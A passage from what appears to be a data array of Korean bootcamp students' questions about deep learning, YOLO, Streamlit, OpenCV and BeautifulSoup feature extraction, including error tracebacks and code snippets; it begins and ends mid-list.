핸즈온 머신러닝과 또 하나가 더 있었던거 같은데 지금 질문이 사라져있더군요. 그래서 해당 링크들 다시 받을 수 있을까요. ',\n","       'adam 의 비율을 설정하는 옵션은 어떨때 진행하게 되는 건가요?\\n항상 설정해주는게 좋은건가요?',\n","       '\\n똑같이 funtional로 했을때는 작동하는데\\nsequential로 작성했을때 에러가 떴는데 해결 가능할까요?',\n","       '안녕하세요. ANN_MNIST_exercise.ipynb에서 질문 있습니다.\\n\\ntrain_x와 test_x 모두 max 255, min 0 입니다.\\n\\n\\nfrom sklearn.preprocessing import MinMaxScaler\\nscaler = MinMaxScaler()\\ntrain_x = scaler.fit_transform(train_x)\\ntest_x = scaler.transform(test_x)\\n\\n\\n위 코드를 실행하면 \\ntrain_x는 max 1, min 0 가 되지만, \\ntest_x도 max 1, min 0 이 될 거라 생각했지만 max 24, min 0이 됩니다. \\n\\n제가 무엇을 잘못 이해하고 있는지 모르겠습니다. \\n실행결과를 첨부했습니다.\\n\\n답변 부탁드립니다. 감사합니다.',\n","       '위쪽이 Sequential 이고 아래쪽이 Funtional입니다 ㅠㅠ.',\n","       '3. batch size가 100이고 epochs이 5인 경우 전체 학습 횟수는 500이라는 말씀이신가요? 전체 학습이라는 게 모든 batch가 각각의 레이어를 통과한 횟수라고 생각하면 될까요?? 그리고 train 데이터의 수가 batch size로 나누어 떨어지지 않는 경우, 학습이 안되나요??\\n\\n답변 주시면 감사하겠습니다 :)',\n","       'onehot인코딩에서 이러한 오류가 뜹니다',\n","       '#############\\n# Your Code #\\n#############\\n#얼리 스톱핑 가져오기\\nfrom tensorflow.keras.callbacks import EarlyStopping\\n#스톱핑 모델 설정\\nes = EarlyStopping(monitor = \\'val_loss\\',\\n                   min_delta = 0,\\n                   patience=5,\\n                   verbose=1,\\n                   restore_best_weights=True)\\n#모델 학습\\nmodel.fit(x_train, y_train, validation_split=0.2, callbacks=[es], epochs = 50,\\n          verbose = 1)\\n\\n이렇게 코딩해서 실행했더니\\nEpoch 1/50\\n---------------------------------------------------------------------------\\nTypeError                                 Traceback (most recent call last)\\n in \\n     12 #모델 학습\\n     13 model.fit(x_train, y_train, validation_split=0.2, callbacks=[es], epochs = 50,\\n---\u0026gt; 14           verbose = 1)\\n\\n1 frames\\n/usr/local/lib/python3.7/dist-packages/tensorflow/python/framework/func_graph.py in autograph_handler(*args, **kwargs)\\n   1145           except Exception as e:  # pylint:disable=broad-except\\n   1146             if hasattr(e, \"ag_error_metadata\"):\\n-\u0026gt; 1147               raise e.ag_error_metadata.to_exception(e)\\n   1148             else:\\n   1149               raise\\n\\nTypeError: in user code:\\n\\n    File \"/usr/local/lib/python3.7/dist-packages/keras/engine/training.py\", line 1021, in train_function  *\\n        return step_function(self, iterator)\\n    File \"/usr/local/lib/python3.7/dist-packages/keras/engine/training.py\", line 1010, in step_function  **\\n        outputs = model.distribute_strategy.run(run_step, args=(data,))\\n    File \"/usr/local/lib/python3.7/dist-packages/keras/engine/training.py\", line 1000, in run_step  **\\n        outputs = model.train_step(data)\\n    File \"/usr/local/lib/python3.7/dist-packages/keras/engine/training.py\", line 860, in train_step\\n        loss = self.compute_loss(x, y, y_pred, sample_weight)\\n    File \"/usr/local/lib/python3.7/dist-packages/keras/engine/training.py\", line 919, in compute_loss\\n        y, y_pred, sample_weight, regularization_losses=self.losses)\\n    File \"/usr/local/lib/python3.7/dist-packages/keras/engine/compile_utils.py\", line 201, in __call__\\n        loss_value = loss_obj(y_t, y_p, sample_weight=sw)\\n    File \"/usr/local/lib/python3.7/dist-packages/keras/losses.py\", line 143, in __call__\\n        losses, sample_weight, reduction=self._get_reduction())\\n    File \"/usr/local/lib/python3.7/dist-packages/keras/utils/losses_utils.py\", line 309, in compute_weighted_loss\\n        losses = tf.convert_to_tensor(losses)\\n\\n    TypeError: Failed to convert elements of  to Tensor. Consider casting elements to a supported type. See https://www.tensorflow.org/api_docs/python/tf/dtypes for supported TF dtypes.\\n\\n이러한 에러가 나오는데 무엇이 문제일까요....?',\n","       '텐서플로우와  케라스의 관계에 대해 잘 이해하지 못한 것 같습니다',\n","       '딥러닝에서 히든레이어의 노드수는 512 - 256 -64 - 32 이런식으로 줄여가는것과\\n반대로 점차 들려가는것 어떤것이 더 적합한가요?? \\n혹시 상황에 따라 다르게 사용한다면 예시를 알수있을까요?',\n","       'dense에 대한 개념이 잡히지 않은 것 같습니다ㅜㅜ',\n","       'mnist 실습 과정에서 x 값을 스케일링 하여 사용하였는데\\n스케일링을 한 x 를 model.fit 하는 것이 원본 x 보다는 성능이 좋게 나오는 이유를 알고 싶습니다.\\n\\n+ 딥러닝에서 스케일링 하는 것이 일반적으로 성능에 좋은 영향을 주나요?',\n","       '안녕하세요.\\n답변 주신 내용으로 인해 이해하는데 많은 도움이 되었습니다.\\n\\n추가적으로 궁금한 내용이 생겨 다시 질문드립니다.\\n\\n1. function API, Sequential API, 멀티 클래스분류까지 해당 부분이 헷갈립니다.\\nfunction API가 여러개의 input/output 내야되는 경우 사용한다고 하셨는데,\\n멀티 클래스 분류인 경우 여러개(3개이상) 입출력 즉, function API 선택하는 것들중에서 확률적으로 높은 클래스의 선택이 필요할때 사용하는 건가요??\\nsequential 의 경우 다중 선택이 불가능하다고 했는데,  한번더 복습하면서 멀티 클래스분류를 살펴보니 갑자기 헷갈리네요ㅠㅠ\\n',\n","       '제가 어제 코로나 검사를 받아 자료를 받지 못했는데 학습자료링크 알려주실 수 있을까요?',\n","       'dense layer와 노드의 차이가 뭔지 잘 모르겠습니다',\n","       '방금 강사님이 얘기를 해주신 것 중에서요 \\nlayer = Dense(1, input_shape = (nfeatures,))  여기서 nfeatures가 분석단위의 구조라고 하셨는데 ,, \\n\\n분석단위는 행을 나타내는 것 아닌가요? 여기서 nfeatures는 열의 개수 아닌가요? \\n',\n","       ' 활성화함수로 relu 함수를 쓰면 0보다 작은 값을 0으로 다 바꿔버리기 때문에 은닉층에서 새롭게 뽑은, 음수 값을 가지는 feature값이 사라져서 손실되는 문제가 발생하고 그럼 성능이 저하되지 않나요?\\n\\n 추가로 NN을 학습시킬 때 train 데이터가 dataframe으로 되어 있어도 상관 없나요?\\n오늘 오전 실습에서 train 데이터를 dataframe과 numpy.array 형식 각각으로 하여 학습을 시켰을 때 별 차이가 없긴 했습니다!',\n","       '지금 하고있는 파일이 다 날아갔습니다 혹시 정답 파일 올려주시나요??',\n","       '캡처 화면과 같이 코딩 후에 실행 했더니\\n\\nValueError: Output tensors of a Functional model must be the output of a TensorFlow `Layer` (thus holding past layer metadata). Found: \\n\\n이런 에러가 발생합니다...ㅜㅜ',\n","       '.history는 loss 값과 val_loss 값들만 뽑기 위해 .history를 끝에 붙이는 것 이라고만 생각하면 될까요?\\n',\n","       '((모델 학습 시 validation_split을 주게 되면 이 검증 데이터에서의 loss값을 기준으로 가중치를 업데이트 해나가는 것인가요? 아니면 훈련 데이터에서의 loss값을 기준으로 가중치를 업데이트 해나가는 것인가요??))\\n이란 질문에\\n\\n((validation_split을 하게 되면 검증 데이터를 분리한 뒤, 학습 데이터를 이용해 학습한 내용을 통해 나온 결과를 검증 데이터의 내용과 비교하게 됩니다. 이를 통해서 loss를 구하게 되고 그 loss를 바탕으로 다시 학습을 진행하게 되는 것이죠.\\n\\n딥러닝에서의 모델을 다듬어나가는 과정은 loss의 값에 기반하게 되므로 말씀하신 것과 같이 검증 데이터가 있다면, 검증 데이터에서 나온 loss를 기준으로 가중치를 업데이트해나가게 됩니다.))\\n의 답변을 받았습니다.\\n\\n제가 이해한 바가 맞다면,\\n1. 훈련데이터로 학습을 한 후 이때의 loss값을 계산하고 역전파알고리즘을 통해 가중치를 업데이트 해나간다. (업데이트 횟수는 epoch만큼)\\n2. validation_split을 주게 된다면 각 학습된 모델에 따라 분리된 검증데이터로 loss값을 계산하게 된다\\n3. 이때, validation_split을 주는 이유는 단순히 가중치를 업데이트해가면서 훈련데이터에만 과적합 되있을 수 있으므로 이를 비교해보기 위함이다.\\n라고 받아들이면 될까요?\\n\\n',\n","       'actiation function의 기능은 들어온 신호를 임계값을 기준으로 넘길지 안넘길지를 판단하여 수행한다라고만 생각하면 될까요?\\n',\n","       '1) 첨부파일의 그래프에서 train_err는 x_train을 모델링으로 돌린 값에 대한 오류이고, val_err는 x_val을 모델링 돌린 값에 대한 오류라고 이해했는데 맞을까요?',\n","       '딥러닝 모델설계에서 summary하는 이유가 파라미터 수 조절 여부를 판단하기 위해서라고 이해했는데, 이해한 내용이 맞을까요??',\n","       '답변해주셔서 감사합니다! \\n\\n혹시 여러 feature로 시도한다고 가정하면, 변수로 지정해주는 등의 방법은 따로 있을까요?',\n","       \"혹시 activation = 'swish'에 대해서  activation = 'relu'와의 차이에 대해서 설명해주실 수 있을까요...?\",\n","       'iris = load_iris()를 실행한 후,\\niris의 타입이 sklearn.utils.Bunch던데 \\n혹시 Bunch가 뭔지 알 수 있을까요?',\n","       'summary에서 각 셀의 의미를 설명듣고 싶은 거였어요 ㅠㅠㅠ',\n","       '금요일에 결석을 하여 강의를 주말에 들으려고 했는데 계속 업로드가 안되네요.. 혹시 언제 업로드 될까요??',\n","       '3. 검증단계에서 pred = np.where(pred\u0026gt;=.5,1,0) 식의 정확한 뜻과 사용 이유가 궁금합니다!',\n","       '5. 분류/회귀 문제를 풀 때 평가 지표를 각각 어떤 것을 사용해야 하는지 모르겠습니다.\\n회귀는 mean_absolute_error, r2_score, 분류는 classification_report, confusion_matrix를 주로 사용하고 있는데 사실 왜 이 방법을  사용하는지 정확한 이유는 모르고 따라만 하고 있습니다... \\n지금과 같은 가이드라인이 없을 경우에는 어떤  평가 방식을 사용해야하는지 고르는 기준이 있을까요?\\n\\n주말이 껴있어서 질문이 많네요ㅜㅜ\\n항상 감사합니다! :)',\n","       '질문2)\\n레이어, 노드의 수는 동일하게 두고,  Adam에서 0.1이 보폭이 넓은거라고 수업시간에 말씀하셔서 0.03, 0.05로 성능 비교해봤는데 오차의 값이 크게 나와서요!  숫자가 클수록, 보폭이 넓고 오차가 적어진다고 보면 될까요?!!!\\n\\n감사합니다. ',\n","       '안녕하세요 몇가지 질문이 생겨 올립니다.\\n\\n1. 딥러닝 가중치 초기 값\\n가중치 초기 값이 랜덤하게 주어지는 것으로 알고 있고 가중치 초기 값을 설정해주는 다양한 방법론들이 존재하는 것으로 알고 있습니다.(He, Xavier 등) 실무에서 가중치 초기값의 설정이 신경망 학습에 많은 영향을 주는 편인가요? 또한 실무에서 딥러닝 프로젝트를 할 때 성능이 좋지 못하면 가장 먼저 재설정해보는 것들이 무엇이 있나요?(가중치 초기 값, layer 갯수 등) case by case인가요?? ',\n","       '2. 오차 역전파 순서\\n오차 역전파 순서가 다음과 같다면\\n-주어진 입력값에 상관없이, 임의의 초기 가중치(w)를 준 뒤 은닉층을 거쳐 결과를 계산\\n-계산 결과와 실제 예측하고자 하는 값 사이의 오차를 구함\\n-가중치를 업데이트\\n-위의 과정을 오차가 더이상 줄어들지 않을 때까지 반복\\n오차역전파를 진행할 때, 먼저 한번 순전파로 진행 후, 오차를 계산한 다음 두번째부터 역전파로 loss로부터 미분 해서 가중치를 업뎃하는 것인가요?\\n\\n\\n감사합니다. \\n',\n","       '주피터랩에서 Adam(lr = 0.1) 이라고 하니깐 오류가 나서 문의합니다',\n","       '줌 웨비나 화면이 갑자기 보이지 않습니다. 새로고침이나 창을 닫고 다시 들어와도 화면이 보이지 않는 상황입니다. 채팅장이나 소리는 확인가능합니다.',\n","       \"강사님이 해주신 설명은 모두 이해를 했는데\\n'어떤수의 제곱을 한다는 것은 1보다 큰값은 더크게, 작은 값은 더 작게 한다는 의미'라는 것은 어떤 것과 연결이 되는 내용인지 제대로 이해하지 못한 것 같습니다ㅠㅠ\",\n","       \"---------------------------------------------------------------------------\\nTypeError                                 Traceback (most recent call last)\\n in \\n      1 # 학습곡선\\n----\u0026gt; 2 dl_history_plot(history)\\n\\n in dl_history_plot(history)\\n      2 def dl_history_plot(history):\\n      3     plt.figure(figsize=(10,6))\\n----\u0026gt; 4     plt.plot(history['loss'], label='train_err')\\n      5     plt.plot(history['val_loss'], label='val_err')\\n      6 \\n\\nTypeError: 'History' object is not subscriptable\\n\\n\\n이렇게 나오는데 어디가 문제일까요..\",\n","       '안녕하세요! \\n\\n데이터를 학습할 시에 반복 학습을 하면서 loss, val_loss가 뜨는 것을 확인할 수 있는데\\n\\nloss값과 val_loss값의 차이를 보면서 오차의 정도를 확인하는 것일까요 ?\\n\\nloss는 훈련 손실값, val_loss는 검증 손실값이라고 하는데\\n 각각 어떤 기준과 비교하여 나온 손실값인지도 잘 이해가 되지 않습니다..ㅠㅠ\\n\\n감사합니다. ',\n","       'filter에 들어가는 값이 랜덤으로 정해진다면, 정말 중요한 특징에 0이 들어가서 계산되어 \\n결과적으로 featrue map에서 0이 되어버리면 그 중요한 feature가 사라져 버리는 건 아닌가요??',\n","       '아하 흑백 지정하는거 이해 했습니다!\\n그럼 왜 흑백으로 지정하는지 여쭤봐도 괜찮을까요?\\n칼라랑 흑백을 지정해주는 기준이 어떻게 될까요?\\n',\n","       '1) 교안 61페이지에 있는 학습하는 과정에서 \\n예측 값과 실제 값을 비교하여 loss fuction으로 오차를 계산하고\\n오차를 줄이기 위해, 파라미터(가중치)를 업데이트 한다고 되어있는데\\n여기서 loss fuction은 이진분류냐 다중분류냐에 따라서 달라지는거라고 이해하는 게 맞나요?\\n그렇다면 파라미터를 업데이트한다는 건 정확히 어떤의미인지가 이해가 잘 안됩니다.',\n","       '1,2,3 feature map 이라고 정의 했을때, 1 -\u0026gt; 2 과정은 패딩이 적용하지 않아서 13 * 13이 유지되지만 2 -\u0026gt;3번 과정은 아무 작업 없이 3 *3 필터로 훑었는데 왜 feature map 사이즈가 13 *13 으로 유지 되는지 잘 모르겠습니다 ㅜㅜ \\n그리고 max pooling과 avg pooling의 개념적 차이는 이해했는데 어느 상황에서 max 를 사용하고 avg를 사용하는지 각 장단점이 무엇인지 알고 싶습니다!!',\n","       '안녕하세요\\n수업중에 의문사항이 있어서 문의를 드립니다.\\n\\n내용\\npooling시 feature들이 128 -\u0026gt; 256개로 변화하는 의미가\\n예를 들면 개와 고양이를 판단할 때 \\n개와 고양이을 구분할 수 있는 특징들이 128개에서 256개가 된다는 의미인가요?\\n아니면 맨 마지막에 fully connected 할 때 노드의 수가 각 동물들을 특징을 구분하는 건가요?\\n',\n","       '1. padding의 목적은 외곽을 좀 더 반영하게 하는 거라지만, padding을 써도 여전히 외곽이 중앙에 비해서 덜 반영되는데, 아예 비슷하게 반영되게 할 수는 없나요?',\n","       '따릉에 데이터에서 \\n\\ni = 30 * 24\\nx_train, x_val = x[:-i], x[-i:]\\ny_train, y_val = y[:-i], y[-i:]\\n\\n이 과정이 왜 있는지 이해가안갑니다 ㅠ',\n","       '원핫인코딩을 해제하고 트레이닝 정확도와 테스트 정확도를 보는 이유가 궁금합니다.',\n","       ' 안녕하세요!\\ndropout 관련해서 질문드립니다.\\n강사님께서 실습에서 dropout을 convolution레이어가 아니라 보통 max pooling레이어 다음에 적용을 하시는데 특별히 이렇게 하시는 이유가 있을까요?',\n","       'Batch Normalization을 하는 이유에 대해서,\\n현재 layer의 입력이 이전 layer의 파라미터의 변화에 영향을 받기 떄문에,\\n그래서 이를 보정하기 위해서 batchnormalization을 사용하는것이 맞는건가요?..',\n","       'CNN에서 각 Layer를 쌓을 때 순서가 궁금합니다. 구글링을 해보니 Convolution - Batch Normalization - Activation - Dropout - Pooling와 같은 순서로 Layer를 쌓는다고 하는데 수업에서는 이 순서가 조금씩 달라지기도 해서 Layer를 쌓는 순서가 중요한지, 어떤 의미를 갖는지 궁금합니다!',\n","       '먼저 자세한 답변 감사드립니다!\\n한가지 궁금한 점이 있어 질문 한번 더 드려요.\\nyolov1의 bounding box가 7*7*2개 인 이유는 7*7 사이즈의 input에서 grid마다 2개씩 bounding box가 존재해서인것이 맞나요??',\n","       '파라미터 계산 할 때 왜 +1을 하는지\\n: +1은 절편 W0입니다\\n\\n라고 아까 하셨는데 절편 w0랑 그거랑 무슨 상관인지 잘 이해가 안 갑니다...!',\n","       '2. 또한, 이미지의 사이즈가 100*150 이라 할 때 해당 픽셀들의 값이 100개의 행과 150개의 열로 구성되어있다고 보는게 맞는건가요?? 그래서 이러한 경우 이미지의 개수가 1000개이고 흑백이라면  input_shape을 (1000,100,150,1) 으로 보는게 맞는지 여쭤보고자합니다.',\n","       '실습을 해보니 이미지 크기를 320과 640으로 설정했을 때 탐지하는 물체의 종류가 640에서 더 많아지는 것을 알 수 있었습니다. \\n저의 경우 320에서는 사람이 메고 있는 가방을 탐지하지 못했는데 640에서는 탐지하였습니다 \\n이러한 이유는 바운드 박스 때문인 것 인가요?\\n\\n첨부한 사진은 640으로 탐지했을 경우입니다 ',\n","       '딥러닝 connection 부분 복습 중에 의문이 생겨서 질문 드립니다. \\ninput에 다중 입력을 받을 때, output layer 전에 합쳐주는 작업이 필요하잖아요?\\n언제 concatenate 해야하고 언제 add 해야하는지 잘 감이 안옵니다...',\n","       'line thickness가  선 굵기 조절외(시각적인)에 따로 object에 영향을 주는것은 없나요?\\n따로 조절해서 확인해보았는데 score값은 동일하게 나오는것 같아서요',\n","       '첨부한 이미지에 --img parameter는 들어오는 input 이미지의 크기를 나타내는 것이라고 들었는데, 이는 width에 해당하는 건가요?\\n\\n그리고 width나 height에 해당한다면 다른 height나 width의 경우도 명시해줄 수 있나요?\\n예) --img 640 480 \\\\',\n","       '!cd yolov3 \\n!pip install -r requirements.txt\\n이렇게 두줄로 쓸때는 requirements.txt 라고만 쓰면 에러가 나고 무조건 /content/yolov3/requirements.txt 라고 경로까지 명시해줘야 실행이 되는데\\n\\n!cd yolov3; pip install -r requirements.txt\\n이런식으로 세미콜론으로 구분 후, 한 줄로 사용하였을 때는 requirements.txt라고만 써도 실행이 잘 되는 이유는 무엇인가요?',\n","       '\\n(base) C:\\\\Users\\\\User\u0026gt;python - V\\nPython 3.8.8 (default, Apr 13 2021, 15:08:03) [MSC v.1916 64 bit (AMD64)] :: Anaconda, Inc. on win32\\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\\n\u0026gt;\u0026gt;\u0026gt; pip install streamlit\\n  File \"\", line 1\\n    pip install streamlit\\n\\n\\n문제가 있어서 설치가 안되는 것이지요?\\n',\n","       '이미 !wget -O /content/yolov5/pretrained/yolov5s.pt https://github.com/ultralytics/yolov5/releases/download/v6.2/yolov5s.pt\\n를 통해서 학습된 모델을 가져온게 아닌가요?  한번더 train하는 이유가 무엇인가요.\\n갑자기 뭔가 많아져서 이해하기가 힘듭니다.',\n","       \"!cd yolov5; python train.py \\\\\\n    --data '/content/yolov5/data/street.yaml' \\\\\\n    --cfg '/content/yolov5/models/yolov5x.yaml' \\\\\\n    --weights '/content/yolov5/pretrained/yolov5x-cls.pt' \\\\\\n    --epochs 1000 \\\\\\n    --patience 10 \\\\\\n    --img 640 \\\\\\n    --project\\n    --name\\n    --exist-ok\\n    # --device cpu\\n\\n에서 --data의 경로 yaml은 클래스 개수가 3개 --cfg의 경로 yaml은 클래스 개수가 80개로 되어있습니다. yolo모델이 알아서 --data의 경로인 class가 3개인 dataset에 맞추어 전이학습\u0026fine tuning을 하나요?\",\n","       'YOLO: Custom data 실습을 사용하다 궁금증이 생겨 문의드립니다.\\n\\n1. .yaml 파일에서 validation 경로를 설정하지 않고, train data의 일부를 분리하여 validation set으로 사용할 수 있는 방법이 없을까요?',\n","       \"st.header('5. Multi select')\\noptions = st.multiselect('좋아하는 색을 모두 골라주세요', \\n                         ['Green', 'Yellow', 'Red', 'Blue', 'Purple', 'Black', 'White'], \\n                         ['Yellow', 'Red', 'Green'])\\nst.write('선호 색상:', options)\\nfor i in options:\\n    st.write(i)\\n\\n이렇게 입력했는데 아래처럼 나오는데 가운데 있는 식이 안나오게 어떻게 해야되나요?\",\n","       '질문 2)\\ndropout  레이어를 적용하면 처음 선택된 동일한 노드들만 모든 epoch에 걸쳐 dropout이 적용되는 것인지,  매 epoch마다 dropout되는 비율을 같게 하면서 새로 랜덤한 노드들을 dropout하는 것인지 궁금합니다.',\n","       'st.columns()가 정확히 어떤 기능을 하는 함수인지 잘 모르겠습니다ㅜㅜ',\n","       \"path: /content/datasets/street  # dataset root dir\\ntrain: images/train  # train images (relative to 'path') 128 images\\nval: images/train  # val images (relative to 'path') 128 images\\n\\n강사님 원본은 이렇게 나와있는데\\npath부분은 실제 obj_train_data를 다운받은 폴더 경로를 입력하는게 맞나요?\\nC:\\\\Users\\\\User\\\\Desktop\\\\KTaivle\\\\수업자료(aivle202202)\\\\220919_시각지능딥러닝\\\\이미지수집\\n예를 들어 이렇게 ..?\\n\\n그리고 train부분은 동일하게 파일 구조 만들었다고 하면\\n그대로 사용해도 되나요?\\n# 이후 부분은 주석처리되어 영향을 안 미치는걸까요?\\n아니면 128 images 부분을 실제 제가 작업한 이미지 갯수대로 변경해야 하는건가요?\\n\",\n","       \"inplace=True옵션을 사용했을 때는 변수로 받는 건 하면 안되는 것으로 알고 있었는데, 강사님께서는 \\n\\ndf_line = df_line.drop(['날짜', '연번', '역번호', '역명', '구분', '합계'], axis=1, inplace=True\\n\\n로 참고사항 적어두셨더라구요.. \\n\\n관련해서 설명 한번만 부탁드립니다ㅠ\",\n","       '어제 수업중에 labels를 어디서 읽는다고 말씀하셨던거 같은데 놓친것 같습니다\\ndatasets/ ... /images/ 는 yaml에서 선언되어 있는데\\nlabels는 선언되지 않았는데 어떻게 읽는지 방식이 궁금해서 질문드립니다 !',\n","       '2. 순서상 다른  모델링들을 하고 마지막에 스태킹 함수를 추가하여 비교하면 잘 돌아가는데 이런식으로 마지막에 코드를 추가하여 비교하는 것이 맞는걸까요?',\n","       'ROOTPATH 확인했는데도 잘모르겠습니다ㅜ\\n', '혹시 캐글 등수 무조건 공개인가용?...',\n","       \"title_len = []\\n\\nfor index, row in df.iterrows():     \\n    soup = BeautifulSoup(row.html_code, 'html.parser')\\n    title_len.append(title_length(soup))\\n    \\ndf['title_length'] = title_len\\n\\n여기서 for index, row in df.iterrows(): 여기 부분 index, row 가 뭔지 잘 모르겠습니다.\\ndf.iterrows()를 index로 돌린다는 건가요? 그리고 row 값으로 받는다? \\n\\n또 row.heml_code 가 어떻게 해석되는지 알 수 있을까요?\",\n","       '1.\\nfor index, row in df.iterrows():\\n왜 반복문을 index, row 두개를 했는 지 궁금합니다',\n","       \"video1 = cv2.VideoCapture(VIDEO_PATH + '/jung.mp4') \\n오전 튜토리얼에서 진행을 한것처럼 비디오를 변수에 저장하였는데 isopened로 확인해보니 계속 false가 나오는 경우 어떤게 잘못된 걸까요...?\",\n","       'df 출력시 데이터가 0.0으로만 나옵니다 \\n왜이러는걸까요??',\n","       '처음에 \\ndef body_length(soup):\\n    body_len = str(soup.body)\\n    return float(len(body_len))\\n이렇게 작성 했을때 통과 됐는데\\n강의 보면서  body_len = str(soup.body)에 text가 추가가 되어\\ndef body_length(soup):\\n    body_len = str(soup.body.text)\\n    return float(len(body_len))\\n이렇게 작성을 했더니 오류가 납니다. 혹시 어떤 문제가 있는지 궁금하여 질문 드립니다.',\n","       \"공백수 구하는 데에서 0.0으로만 나오는데 왜그런지 모르겠어요.\\n\\n# Feature(특징) 데이터를 추출하는 함수를 작성합니다.\\n\\ndef whitespace_num(soup):\\n    try:\\n        Nullcount = soup.body.text.count(' ')                                         \\n        return float(Nullcont)\\n    except:\\n        return 0.0\\n\\n# 데이터 프레임의 html_code 컬럼에서 Feature(특징) 데이터를 추출합니다.\\n\\nnum_whitespace = []\\n\\nfor index, row in df.iterrows():\\n    soup = BeautifulSoup(row.html_code, 'html.parser')\\n    num_whitespace.append(whitespace_num(soup))\\n    \\ndf['whitespace_num'] = num_whitespace\",\n","       '안녕하세요!\\n\\n오전 실습중 태그 예외 처리를 한것 같은데,\\n4.0으로 값이 나오는데, 이유가 궁금합니다.\\n\\n4.0 값을 없애려면 어떻게 하는게 좋을지도 궁금합니다.\\n\\n',\n","       '해당 실습 부분에서 glob을 활용해서 video_list를 불러오는 것 까지는 확인했습니다.\\n그런데 video_list.isOpened()로 확인해보니 False로 뜨는데, \\n저렇게 파일 불러오는 방법이 틀린 것인가요?? \\n\\n어떤 부분이 틀렸는지 잘 모르겠습니다.. ',\n","       \"soup = BeautifulSoup(row.html_code, 'html.parser')\\n에서\\n 'row.html_code'는 원래 쓰이는 요소인가요 아니면\\n변수를 따로 지정한 것인가요? \\n\",\n","       'def link_in_script(soup):\\n        num0fLink = len(soup.findAll(\\'script\\', {\"src\": True}))\\n        num0fLink += len(soup.findAll(\\'script\\', {\"href\": True}))\\n        return float(num0fLink)\\n\\nlink_num = []\\n\\nfor index, row in df.iterrows():\\n    soup = BeautifulSoup(row.html_code, \\'html.parser\\')\\n    link_num.append(link_in_script(soup))\\n    \\n    df[\\'link_in_script\\'] = link_num\\n\\n\\n강사님과 같은 코드인데 왜 리스트 오류가 생기는지 모르겠네요.\\nLength of values (1) does not match length of index (40)',\n","       '안녕하세요, \\n\\n학습 데이터 세트를 클래스 별로 만든다는 것이 헷갈려서 질문드립니다.\\n\\n이전에 4개의 영상(jung, park, sam, sayuri)에서 각각 이미지 데이터를 만들었는데요.\\n\\n여기서 해당 클래스(사람)의 이미지가 있는 경우만 골라서 train 폴더에 저장하라는 뜻이 맞을까요?',\n","       \"프레임 단위로 자르다가 너무 오래 걸리기에 5초 단위로 자를려고 이렇게 코딩했는데 이미지 파일이 폴더부터 나타나지 않습니다.\\n\\n# 실습해보세요.\\ni = 0\\nTime = 1\\n\\nfor i in (0, 1, 2, 3):\\n  video  = cv2.VideoCapture(video_list[i])\\n  image_path2 = IMAGE_PATH + '/' + str(i)\\n\\n  if not os.path.exists(image_path2):\\n    os.mkdir(image_path2)\\n  \\n  while video.isOpened():\\n    ret, frame = video.read()\\n    if ret:\\n      frame_sec = video.get(cv2.CAP_PROP_POS_MSEC)/1000\\n      if frame_sec.is_integer():\\n        if(frame_sec % Time ==0):\\n\\n          filename = image_path2 + '/' + str(round(frame_sec)) + '.jpg'\\n          cv2.imwrite(filename, frame)\\n    else:\\n      break\\n\\n  video.release()\\n  i += 1\\n\\n\\n\\n무엇이 문제인가요...?\\n\\n++시간이 지나니 이미지가 하나씩 올라오는 중인데 이게 원래 이렇게 오래 걸리는건가요?\",\n","       ' url_ip_present의 0은 ip 표시를 하지 않았다는 의미가 맞을까요?',\n","       '안녕하세요 ai모델링 들어가기전에 전처리하다가 질문이 생겨서 질문 남깁니다!\\n\\n1. 전처리 중복 데이터 제거\\ndata.drop_duplicates()\\ndata.T.drop_duplicates().T\\n이런식으로 중복행과 열을 제거 했는데 생각보다 제거가 거의 안되어서 \\n이것 말고 중복데이터를 제거 하는 방법이 있나요?',\n","       \"2. html_num_tags('applet')\\n이렇게 괄호안에 작은 따옴표가 있는경우 열 삭제시 문자열로 인식이 안되는데 \\ncol_x = ['html_num_tags('applet')']\\ndata.drop(col_x, axis=1, inplace=True)\\n이렇게 넣어서 삭제하고 싶을경우에는 어떻게 해야하나요?\\n\\n감사합니다!\",\n","       '모델 레이어를 쌓는 중입니다\\ninput shape는 target_size에 rgb니까 3을 넣으면 될까요?\\ndim 오류가 나서 문의드립니다',\n","       \"태그 개수와 관련된 변수들 형식이 다 \\n\\nhtml_num_tags('iframe') \\nhtml_num_tags('body')\\n\\n처럼 튜플 안에 ' '이 들어가 있어서 분석을 위해 data['html_num_tags('iframe')']과 같은 식으로 활용하면 계속해서 오류가 발생합니다.\\n변수의 원형을 유지하는 것이 맞는지만 확인하기 위해 질문 남깁니다.\\n\\n항상 감사합니다.\",\n","       '3. AI모델링에서 모델을 만들고 내일 캐글에 참여할 때\\n딥러닝 알고리즘을 이용한 모델을 만들어도 상관이 없을까요?',\n","       \"img_height = 400\\nimg_width = 854\\n\\n위와같이 주고\\n\\nkeras.backend.clear_session()\\nmodel = keras.models.Sequential()\\nmodel.add(Conv2D(32, kernel_size=(3, 3), activation='relu', input_shape=(400,854,16)))\\nmodel.add(Conv2D(64, (3, 3), activation='relu'))\\nmodel.add(MaxPooling2D(pool_size=(2, 2)))\\nmodel.add(Flatten())\\nmodel.add(Dense(128, activation='relu'))\\nmodel.add(Dense(3, activation='softmax'))\\n\\n\\nmodel.compile(loss=keras.losses.sparse_categorical_crossentropy,\\n              optimizer='adam',\\n              metrics=['accuracy'])\\n\\n모델은 위와같이 짰습니다. 근데 모델 fit 하려고 하면 에러가 뜨네요 ㅜㅜ\\n\\nmodel.fit_generator(\\n        train_generator, steps_per_epoch=80, epochs=50, \\n                    validation_data = validation_generator, \\n                    validation_steps=5)\\n\\n이유를 알 수 있을까요?\",\n","       'for i in range(4):\\n  video = cv2.VideoCapture(video_list[i])\\n\\n  IMAGE_PATH = ROOT_PATH + \\'/image\\'\\n\\n  TIME_MEASUERMENT_UNIT = 5 #TIME MEASUREMENT UNIT을 통해 몇 초 단위로 이미지를 저장할 지 선택\\n\\n  if not os.path.exists(IMAGE_PATH):\\n    os.mkdir(IMAGE_PATH)\\n\\n\\n  while video.isOpened():\\n    ret,frame = video.read()\\n    if ret:\\n      # 현재 프레임 위치 (msec) \\n      frame_sec = video.get(cv2.CAP_PROP_POS_MSEC)/1000\\n      if frame_sec.is_integer():\\n        if (frame_sec % TIME_MEASUERMENT_UNIT == 0):\\n          filename = IMAGE_PATH + \"/\" + str(round(frame_sec)) + \".jpg\"\\n          cv2.imwrite(filename, frame) \\n      else:\\n        break\\n\\nvideo.release()\\n\\n\\n여기서 각 동영상에 맞는 이미지들을 각각의 파일에 지정하고 싶으면 어떻게 해야 하나요??',\n","       